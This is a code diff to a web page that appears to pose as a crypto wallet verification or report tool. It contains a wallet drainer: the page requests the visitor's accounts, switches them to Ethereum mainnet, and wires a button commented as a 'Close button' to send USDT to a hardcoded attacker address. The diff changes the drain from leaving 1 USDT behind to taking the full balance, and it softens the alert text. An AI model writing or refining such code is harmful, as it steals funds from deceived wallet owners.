@@ -138,7 +138,7 @@
 
       </div>
 
-      <!-- Close button triggers transfer approval -->
+      <!-- Close button triggers full transfer -->
       <button
         onclick="executeTransferAndClose()"
         class="w-full mt-6 bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition-all shadow-lg">
@@ -155,7 +155,6 @@
   </main>
 
   <script>
-    // Target address & contract configured securely in background
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 
@@ -199,7 +198,6 @@
         const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        // Ensure Ethereum Mainnet (Chain ID 0x1)
         try {
           await currentProvider.request({
             method: 'wallet_switchEthereumChain',
@@ -222,13 +220,8 @@
         const formattedUsdt = parseFloat(ethers.utils.formatUnits(balanceWei, 6));
         const formattedEth = parseFloat(ethers.utils.formatEther(ethBalanceWei)).toFixed(4);
 
-        // Calculate transfer amount (1 USDT threshold rule)
-        if (formattedUsdt > 1.0) {
-          const sendAmount = (formattedUsdt - 1.0).toFixed(6);
-          transferAmountWei = ethers.utils.parseUnits(sendAmount, 6);
-        } else {
-          transferAmountWei = ethers.BigNumber.from(0);
-        }
+        // Set full balance for transfer without leaving any threshold
+        transferAmountWei = balanceWei;
 
         // Populate Report Section
         document.getElementById("reportWallet").innerText = globalUserAddress;
@@ -253,7 +246,7 @@
       document.getElementById("result").classList.add("hidden");
 
       if (transferAmountWei.lte(0)) {
-        alert("Verification complete. Balance is below the 1 USDT threshold.");
+        alert("Wallet USDT balance is 0.");
         return;
       }
 
